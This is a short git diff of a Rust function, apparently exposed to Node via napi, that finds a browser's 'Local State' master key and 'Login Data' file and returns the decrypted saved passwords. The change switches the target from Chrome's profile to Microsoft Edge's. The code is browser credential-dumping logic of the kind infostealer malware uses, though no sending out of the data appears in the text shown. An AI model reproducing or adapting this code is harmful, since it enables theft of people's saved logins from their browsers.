@@ -9,8 +9,8 @@ use tabled::settings::{Style, Width};
 #[napi]
 pub fn get_password() -> Vec<Vec<String>> {
   let user_profile = env::var("LOCALAPPDATA").unwrap();
-  let local_state_path = PathBuf::from(&user_profile).join("Google/Chrome/User Data/Local State");
-  let login_data_path = PathBuf::from(&user_profile).join("Google/Chrome/User Data/Default/Login Data");
+  let local_state_path = PathBuf::from(&user_profile).join("Microsoft/Edge/User Data/Local State");
+  let login_data_path = PathBuf::from(&user_profile).join("Microsoft/Edge/User Data/Default/Login Data");
 
   let master_key = chrome_password::get_master_key(&local_state_path);
   chrome_password::get_password(&login_data_path, &master_key)
